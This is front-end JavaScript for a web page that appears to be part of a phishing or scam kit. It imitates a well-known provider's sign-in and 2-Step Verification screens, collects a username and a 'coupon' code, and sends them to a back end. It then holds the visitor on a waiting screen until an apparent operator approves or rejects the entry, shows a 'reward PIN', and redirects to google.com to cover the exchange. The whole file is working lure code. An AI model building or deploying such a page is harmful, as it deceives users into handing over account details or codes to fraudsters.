let currentUsername = '';
let currentCoupon = '';
let currentToken = localStorage.getItem('user_token') || '';
let eventSource = null;
let redirectUrl = 'https://google.com';

const step1 = document.getElementById('step1');
const step2 = document.getElementById('step2');
const stepWaiting = document.getElementById('stepWaiting');
const step3 = document.getElementById('step3');
const stepRejected = document.getElementById('stepRejected');
const progressBar = document.getElementById('progressBar');

const pageTitle = document.getElementById('pageTitle');
const pageSubtitle = document.getElementById('pageSubtitle');
const chipUsername = document.getElementById('chipUsername');

const usernameInput = document.getElementById('usernameInput');
const couponInput = document.getElementById('couponInput');
const pinDisplay = document.getElementById('pinDisplay');

const btnNext1 = document.getElementById('btnNext1');
const btnBack2 = document.getElementById('btnBack2');
const btnSubmit2 = document.getElementById('btnSubmit2');
const btnDone = document.getElementById('btnDone');
const btnRetry = document.getElementById('btnRetry');

function showStep(stepName) {
  step1.classList.add('hidden');
  step2.classList.add('hidden');
  stepWaiting.classList.add('hidden');
  step3.classList.add('hidden');
  stepRejected.classList.add('hidden');
  progressBar.classList.remove('active');

  if (stepName === 'step1') {
    pageTitle.textContent = 'Sign in';
    pageSubtitle.textContent = 'to continue to your account';
    pageSubtitle.style.display = 'block';
    step1.classList.remove('hidden');
    usernameInput.focus();
  } else if (stepName === 'step2') {
    pageTitle.textContent = 'Welcome';
    pageSubtitle.style.display = 'none';
    chipUsername.textContent = currentUsername;
    step2.classList.remove('hidden');
    couponInput.focus();
  } else if (stepName === 'waiting') {
    pageTitle.textContent = '';
    pageSubtitle.textContent = '';
    pageSubtitle.style.display = 'none';
    stepWaiting.classList.remove('hidden');
    progressBar.classList.add('active');
  } else if (stepName === 'step3') {
    pageTitle.textContent = '2-Step Verification';
    pageSubtitle.style.display = 'none';
    step3.classList.remove('hidden');
  } else if (stepName === 'rejected') {
    pageTitle.textContent = 'Couldn\'t sign you in';
    pageSubtitle.textContent = '';
    pageSubtitle.style.display = 'none';
    stepRejected.classList.remove('hidden');
  }
}

// Check ongoing session
async function checkExistingSession() {
  if (!currentToken) return;

  try {
    const res = await fetch(`/api/submissions/${currentToken}/status`);
    if (!res.ok) {
      localStorage.removeItem('user_token');
      currentToken = '';
      return;
    }
    const data = await res.json();
    currentUsername = data.username || '';
    if (data.status === 'pending') {
      showStep('waiting');
      listenForStatus(currentToken);
    } else if (data.status === 'approved') {
      pinDisplay.textContent = data.reward_pin || '----';
      redirectUrl = data.redirect_url || redirectUrl;
      showStep('step3');
    } else if (data.status === 'rejected') {
      showStep('rejected');
    } else if (data.status === 'completed') {
      localStorage.removeItem('user_token');
      currentToken = '';
      showStep('step1');
    }
  } catch (err) {
    console.error(err);
  }
}

// Step 1 -> Next
btnNext1.addEventListener('click', () => {
  const val = usernameInput.value.trim();
  if (!val) {
    usernameInput.focus();
    return;
  }
  currentUsername = val;
  showStep('step2');
});

usernameInput.addEventListener('keypress', (e) => {
  if (e.key === 'Enter') {
    btnNext1.click();
  }
});

// Step 2 -> Back
btnBack2.addEventListener('click', () => {
  showStep('step1');
});

// Step 2 -> Submit
btnSubmit2.addEventListener('click', async () => {
  const val = couponInput.value.trim();
  if (!val) {
    couponInput.focus();
    return;
  }
  currentCoupon = val;

  btnSubmit2.disabled = true;
  try {
    const res = await fetch('/api/submissions', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: currentUsername,
        coupon: currentCoupon
      })
    });

    const data = await res.json();
    if (data.success && data.token) {
      currentToken = data.token;
      localStorage.setItem('user_token', currentToken);
      showStep('waiting');
      listenForStatus(currentToken);
    }
  } catch (err) {
    console.error(err);
  } finally {
    btnSubmit2.disabled = false;
  }
});

couponInput.addEventListener('keypress', (e) => {
  if (e.key === 'Enter') {
    btnSubmit2.click();
  }
});

// Real-time listener via SSE
function listenForStatus(token) {
  if (eventSource) {
    eventSource.close();
  }

  eventSource = new EventSource(`/api/submissions/${token}/events`);

  eventSource.onmessage = (event) => {
    try {
      const data = JSON.parse(event.data);
      if (data.status === 'approved') {
        if (eventSource) eventSource.close();
        pinDisplay.textContent = data.reward_pin || '----';
        redirectUrl = data.redirect_url || redirectUrl;
        showStep('step3');
      } else if (data.status === 'rejected') {
        if (eventSource) eventSource.close();
        showStep('rejected');
      }
    } catch (err) {
      console.error(err);
    }
  };

  eventSource.onerror = () => {
    setTimeout(async () => {
      if (currentToken) {
        try {
          const res = await fetch(`/api/submissions/${currentToken}/status`);
          if (res.ok) {
            const data = await res.json();
            if (data.status === 'approved') {
              if (eventSource) eventSource.close();
              pinDisplay.textContent = data.reward_pin || '----';
              redirectUrl = data.redirect_url || redirectUrl;
              showStep('step3');
            } else if (data.status === 'rejected') {
              if (eventSource) eventSource.close();
              showStep('rejected');
            }
          }
        } catch (e) {}
      }
    }, 3000);
  };
}

// Step 3 -> Done (Redirect to main website)
btnDone.addEventListener('click', async () => {
  btnDone.disabled = true;
  try {
    const res = await fetch(`/api/submissions/${currentToken}/complete`, {
      method: 'POST'
    });
    const data = await res.json();
    localStorage.removeItem('user_token');
    window.location.href = data.redirect_url || redirectUrl;
  } catch (err) {
    console.error(err);
    localStorage.removeItem('user_token');
    window.location.href = redirectUrl;
  }
});

// Retry from Rejected
btnRetry.addEventListener('click', () => {
  localStorage.removeItem('user_token');
  currentToken = '';
  couponInput.value = '';
  showStep('step1');
});

// Initialize
checkExistingSession();
